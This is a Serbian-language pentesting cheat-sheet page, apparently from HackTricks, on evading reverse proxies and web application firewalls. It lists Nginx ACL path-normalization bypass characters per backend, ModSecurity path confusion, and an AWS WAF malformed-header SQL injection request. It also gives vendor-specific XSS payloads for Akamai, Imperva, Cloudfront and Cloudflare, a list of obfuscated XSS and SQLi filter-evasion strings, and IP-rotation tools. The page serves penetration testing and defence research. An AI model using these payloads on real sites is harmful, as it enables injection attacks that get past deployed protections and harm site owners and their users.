# Proxy / WAF zaštita zaobilaženje

{{#include ../banners/hacktricks-training.md}}

<figure><img src="https://pentest.eu/RENDER_WebSec_10fps_21sec_9MB_29042024.gif" alt=""><figcaption></figcaption></figure>

{% embed url="https://websec.nl/" %}

## Zaobilaženje Nginx ACL pravila pomoću manipulacije putanjom <a href="#heading-pathname-manipulation-bypassing-reverse-proxies-and-load-balancers-security-rules" id="heading-pathname-manipulation-bypassing-reverse-proxies-and-load-balancers-security-rules"></a>

Tehnike [iz ovog istraživanja](https://rafa.hashnode.dev/exploiting-http-parsers-inconsistencies).

Primer Nginx pravila:
```plaintext
location = /admin {
deny all;
}

location = /admin/ {
deny all;
}
```
Da bi se sprečili zaobilaženja, Nginx vrši normalizaciju putanje pre nego što je proveri. Međutim, ako backend server vrši drugačiju normalizaciju (uklanjajući karaktere koje nginx ne uklanja), može biti moguće zaobići ovu odbranu.

### **NodeJS - Express**

| Nginx Verzija | **Node.js Karakteri za zaobilaženje** |
| -------------- | ------------------------------------- |
| 1.22.0        | `\xA0`                               |
| 1.21.6        | `\xA0`                               |
| 1.20.2        | `\xA0`, `\x09`, `\x0C`               |
| 1.18.0        | `\xA0`, `\x09`, `\x0C`               |
| 1.16.1        | `\xA0`, `\x09`, `\x0C`               |

### **Flask**

| Nginx Verzija | **Flask Karakteri za zaobilaženje**                                   |
| -------------- | --------------------------------------------------------------- |
| 1.22.0        | `\x85`, `\xA0`                                                  |
| 1.21.6        | `\x85`, `\xA0`                                                  |
| 1.20.2        | `\x85`, `\xA0`, `\x1F`, `\x1E`, `\x1D`, `\x1C`, `\x0C`, `\x0B` |
| 1.18.0        | `\x85`, `\xA0`, `\x1F`, `\x1E`, `\x1D`, `\x1C`, `\x0C`, `\x0B` |
| 1.16.1        | `\x85`, `\xA0`, `\x1F`, `\x1E`, `\x1D`, `\x1C`, `\x0C`, `\x0B` |

### **Spring Boot**

| Nginx Verzija | **Spring Boot Karakteri za zaobilaženje** |
| -------------- | ----------------------------------------- |
| 1.22.0        | `;`                                       |
| 1.21.6        | `;`                                       |
| 1.20.2        | `\x09`, `;`                               |
| 1.18.0        | `\x09`, `;`                               |
| 1.16.1        | `\x09`, `;`                               |

### **PHP-FPM**

Nginx FPM konfiguracija:
```plaintext
location = /admin.php {
deny all;
}

location ~ \.php$ {
include snippets/fastcgi-php.conf;
fastcgi_pass unix:/run/php/php8.1-fpm.sock;
}
```
Nginx je podešen da blokira pristup `/admin.php`, ali je moguće zaobići ovo pristupom `/admin.php/index.php`.

### Kako sprečiti
```plaintext
location ~* ^/admin {
deny all;
}
```
## Bypass Mod Security Rules <a href="#heading-bypassing-aws-waf-acl" id="heading-bypassing-aws-waf-acl"></a>

### Path Confusion

[**U ovom postu**](https://blog.sicuranext.com/modsecurity-path-confusion-bugs-bypass/) objašnjeno je da ModSecurity v3 (do 3.0.12), **nepravilno implementira `REQUEST_FILENAME`** varijablu koja je trebala da sadrži pristupnu putanju (do početka parametara). To je zato što je izvršavao URL dekodiranje da bi dobio putanju.\
Zbog toga, zahtev kao što je `http://example.com/foo%3f';alert(1);foo=` u mod security će pretpostaviti da je putanja samo `/foo` jer se `%3f` transformiše u `?`, završavajući URL putanju, ali zapravo putanja koju server prima biće `/foo%3f';alert(1);foo=`.

Varijable `REQUEST_BASENAME` i `PATH_INFO` su takođe bile pogođene ovim greškom.

Nešto slično se dogodilo u verziji 2 Mod Security koja je omogućila zaobilaženje zaštite koja je sprečavala korisnike da pristupaju datotekama sa specifičnim ekstenzijama vezanim za rezervne datoteke (kao što su `.bak`) jednostavno slanjem tačke URL kodirane u `%2e`, na primer: `https://example.com/backup%2ebak`.

## Bypass AWS WAF ACL <a href="#heading-bypassing-aws-waf-acl" id="heading-bypassing-aws-waf-acl"></a>

### Malformed Header

[Ova istraživanja](https://rafa.hashnode.dev/exploiting-http-parsers-inconsistencies) pominju da je bilo moguće zaobići AWS WAF pravila primenjena na HTTP zaglavlja slanjem "neispravnog" zaglavlja koje nije pravilno analizirano od strane AWS-a, ali jeste od strane backend servera.

Na primer, slanjem sledećeg zahteva sa SQL injekcijom u zaglavlju X-Query:
```http
GET / HTTP/1.1\r\n
Host: target.com\r\n
X-Query: Value\r\n
\t' or '1'='1' -- \r\n
Connection: close\r\n
\r\n
```
Moguće je bilo zaobići AWS WAF jer nije razumeo da je sledeća linija deo vrednosti zaglavlja dok je NODEJS server to razumeo (ovo je ispravljeno).

## Opšti WAF zaobilaženja

### Ograničenja veličine zahteva

Obično WAF-ovi imaju određeno ograničenje dužine zahteva za proveru i ako je POST/PUT/PATCH zahtev veći od toga, WAF neće proveriti zahtev.

- Za AWS WAF, možete [**proveriti dokumentaciju**](https://docs.aws.amazon.com/waf/latest/developerguide/limits.html)**:**

<table data-header-hidden><thead><tr><th width="687"></th><th></th></tr></thead><tbody><tr><td>Maksimalna veličina tela web zahteva koja može biti pregledana za zaštitu od Application Load Balancer i AWS AppSync</td><td>8 KB</td></tr><tr><td>Maksimalna veličina tela web zahteva koja može biti pregledana za zaštitu od CloudFront, API Gateway, Amazon Cognito, App Runner i Verified Access**</td><td>64 KB</td></tr></tbody></table>

- Iz [**Azure dokumenata**](https://learn.microsoft.com/en-us/azure/web-application-firewall/ag/application-gateway-waf-request-size-limits)**:**

Stariji Web Application Firewalls sa Core Rule Set 3.1 (ili nižim) dozvoljavaju poruke veće od **128 KB** isključivanjem inspekcije tela zahteva, ali te poruke neće biti proverene na ranjivosti. Za novije verzije (Core Rule Set 3.2 ili novije), isto se može uraditi isključivanjem maksimalnog ograničenja veličine tela zahteva. Kada zahtev premaši ograničenje veličine:

Ako je **mod prevencije**: Zapisuje i blokira zahtev.\
Ako je **mod detekcije**: Pregleda do ograničenja, ignoriše ostatak i zapisuje ako `Content-Length` premašuje ograničenje.

- Iz [**Akamai**](https://community.akamai.com/customers/s/article/Can-WAF-inspect-all-arguments-and-values-in-request-body?language=en_US)**:**

Podrazumevano, WAF pregledava samo prvih 8KB zahteva. Može povećati ograničenje do 128KB dodavanjem naprednih metapodataka.

- Iz [**Cloudflare**](https://developers.cloudflare.com/ruleset-engine/rules-language/fields/#http-request-body-fields)**:**

Do 128KB.

### Obfuscation <a href="#obfuscation" id="obfuscation"></a>
```bash
# IIS, ASP Clasic
<%s%cr%u0131pt> == <script>

# Path blacklist bypass - Tomcat
/path1/path2/ == ;/path1;foo/path2;bar/;
```
### Unicode Kompatibilnost <a href="#unicode-compatability" id="unicode-compatability"></a>

U zavisnosti od implementacije Unicode normalizacije (više informacija [ovde](https://jlajara.gitlab.io/Bypass_WAF_Unicode)), karakteri koji dele Unicode kompatibilnost mogu biti u mogućnosti da zaobiđu WAF i izvrše se kao predviđeni payload. Kompatibilni karakteri se mogu naći [ovde](https://www.compart.com/en/unicode).

#### Primer <a href="#example" id="example"></a>
```bash
# under the NFKD normalization algorithm, the characters on the left translate
# to the XSS payload on the right
＜img src⁼p onerror⁼＇prompt⁽1⁾＇﹥  --> ＜img src=p onerror='prompt(1)'>
```
### Bypass Contextual WAFs with encodings <a href="#ip-rotation" id="ip-rotation"></a>

Kao što je pomenuto u [**ovom blog postu**](https://0x999.net/blog/exploring-javascript-events-bypassing-wafs-via-character-normalization#bypassing-web-application-firewalls-via-character-normalization), da bismo zaobišli WAF-ove koji mogu održavati kontekst korisničkog unosa, mogli bismo zloupotrebiti WAF tehnike da zapravo normalizujemo korisnički unos.

Na primer, u postu se pominje da je **Akamai URL dekodirao korisnički unos 10 puta**. Stoga će nešto poput `<input/%2525252525252525253e/onfocus` biti viđeno od strane Akamai-a kao `<input/>/onfocus` što **može pomisliti da je u redu jer je tag zatvoren**. Međutim, sve dok aplikacija ne URL dekodira unos 10 puta, žrtva će videti nešto poput `<input/%25252525252525253e/onfocus` što je **i dalje važeće za XSS napad**.

Stoga, ovo omogućava da se **sakriju payload-i u kodiranim komponentama** koje će WAF dekodirati i interpretirati dok žrtva neće.

Štaviše, ovo se može uraditi ne samo sa URL kodiranim payload-ima, već i sa drugim kodiranjima kao što su unicode, hex, octal...

U postu su predloženi sledeći konačni zaobilaženja:

- Akamai:`akamai.com/?x=<x/%u003e/tabindex=1 autofocus/onfocus=x=self;x['ale'%2b'rt'](999)>`
- Imperva:`imperva.com/?x=<x/\x3e/tabindex=1 style=transition:0.1s autofocus/onfocus="a=document;b=a.defaultView;b.ontransitionend=b['aler'%2b't'];style.opacity=0;Object.prototype.toString=x=>999">`
- AWS/Cloudfront:`docs.aws.amazon.com/?x=<x/%26%23x3e;/tabindex=1 autofocus/onfocus=alert(999)>`
- Cloudflare:`cloudflare.com/?x=<x tabindex=1 autofocus/onfocus="style.transition='0.1s';style.opacity=0;self.ontransitionend=alert;Object.prototype.toString=x=>999">`

Takođe se pominje da, u zavisnosti od **toga kako neki WAF-ovi razumeju kontekst** korisničkog unosa, može biti moguće zloupotrebiti to. Predloženi primer u blogu je da Akamai dozvoljava da se stavi bilo šta između `/*` i `*/` (potencijalno zato što se ovo često koristi kao komentari). Stoga, SQL injekcija kao što je `/*'or sleep(5)-- -*/` neće biti uhvaćena i biće važeća jer je `/*` početni string injekcije, a `*/` je komentarisano.

Ove vrste kontekstualnih problema se takođe mogu koristiti za **zloupotrebu drugih ranjivosti osim one za koju se očekuje da će biti iskorišćena od strane WAF-a** (npr. ovo se takođe može koristiti za iskorišćavanje XSS-a).

### H2C Smuggling <a href="#ip-rotation" id="ip-rotation"></a>

{{#ref}}
h2c-smuggling.md
{{#endref}}

### IP Rotation <a href="#ip-rotation" id="ip-rotation"></a>

- [https://github.com/ustayready/fireprox](https://github.com/ustayready/fireprox): Generišite URL API gateway-a za korišćenje sa ffuf
- [https://github.com/rootcathacking/catspin](https://github.com/rootcathacking/catspin): Slično fireprox-u
- [https://github.com/PortSwigger/ip-rotate](https://github.com/PortSwigger/ip-rotate): Burp Suite dodatak koji koristi API gateway IP adrese
- [https://github.com/fyoorer/ShadowClone](https://github.com/fyoorer/ShadowClone): Dinamički određeni broj instanci kontejnera se aktivira na osnovu veličine ulazne datoteke i faktora deljenja, pri čemu se ulaz deli na delove za paralelno izvršavanje, kao što je 100 instanci koje obrađuju 100 delova iz ulazne datoteke od 10.000 linija sa faktorom deljenja od 100 linija.
- [https://0x999.net/blog/exploring-javascript-events-bypassing-wafs-via-character-normalization#bypassing-web-application-firewalls-via-character-normalization](https://0x999.net/blog/exploring-javascript-events-bypassing-wafs-via-character-normalization#bypassing-web-application-firewalls-via-character-normalization)

### Regex Bypasses

Različite tehnike se mogu koristiti za zaobilaženje regex filtera na vatrozidima. Primeri uključuju naizmenično korišćenje velikih i malih slova, dodavanje preloma linija i kodiranje payload-a. Resursi za različita zaobilaženja mogu se naći na [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/XSS%20Injection/README.md#filter-bypass-and-exotic-payloads) i [OWASP](https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html). Primeri u nastavku su preuzeti iz [ovog članka](https://medium.com/@allypetitt/5-ways-i-bypassed-your-web-application-firewall-waf-43852a43a1c2).
```bash
<sCrIpT>alert(XSS)</sCriPt> #changing the case of the tag
<<script>alert(XSS)</script> #prepending an additional "<"
<script>alert(XSS) // #removing the closing tag
<script>alert`XSS`</script> #using backticks instead of parenetheses
java%0ascript:alert(1) #using encoded newline characters
<iframe src=http://malicous.com < #double open angle brackets
<STYLE>.classname{background-image:url("javascript:alert(XSS)");}</STYLE> #uncommon tags
<img/src=1/onerror=alert(0)> #bypass space filter by using / where a space is expected
<a aa aaa aaaa aaaaa aaaaaa aaaaaaa aaaaaaaa aaaaaaaaaa href=javascript:alert(1)>xss</a> #extra characters
Function("ale"+"rt(1)")(); #using uncommon functions besides alert, console.log, and prompt
javascript:74163166147401571561541571411447514115414516216450615176 #octal encoding
<iframe src="javascript:alert(`xss`)"> #unicode encoding
/?id=1+un/**/ion+sel/**/ect+1,2,3-- #using comments in SQL query to break up statement
new Function`alt\`6\``; #using backticks instead of parentheses
data:text/html;base64,PHN2Zy9vbmxvYWQ9YWxlcnQoMik+ #base64 encoding the javascript
%26%2397;lert(1) #using HTML encoding
<a src="%0Aj%0Aa%0Av%0Aa%0As%0Ac%0Ar%0Ai%0Ap%0At%0A%3Aconfirm(XSS)"> #Using Line Feed (LF) line breaks
<BODY onload!#$%&()*~+-_.,:;?@[/|\]^`=confirm()> # use any chars that aren't letters, numbers, or encapsulation chars between event handler and equal sign (only works on Gecko engine)
```
## Alati

- [**nowafpls**](https://github.com/assetnote/nowafpls): Burp dodatak za dodavanje beskorisnih podataka u zahteve kako bi se zaobišli WAF-ovi po dužini

## Reference

- [https://rafa.hashnode.dev/exploiting-http-parsers-inconsistencies](https://rafa.hashnode.dev/exploiting-http-parsers-inconsistencies)
- [https://blog.sicuranext.com/modsecurity-path-confusion-bugs-bypass/](https://blog.sicuranext.com/modsecurity-path-confusion-bugs-bypass/)
- [https://www.youtube.com/watch?v=0OMmWtU2Y_g](https://www.youtube.com/watch?v=0OMmWtU2Y_g)
- [https://0x999.net/blog/exploring-javascript-events-bypassing-wafs-via-character-normalization#bypassing-web-application-firewalls-via-character-normalization](https://0x999.net/blog/exploring-javascript-events-bypassing-wafs-via-character-normalization#bypassing-web-application-firewalls-via-character-normalization)

<figure><img src="https://pentest.eu/RENDER_WebSec_10fps_21sec_9MB_29042024.gif" alt=""><figcaption></figcaption></figure>

{% embed url="https://websec.nl/" %}

{{#include ../banners/hacktricks-training.md}}
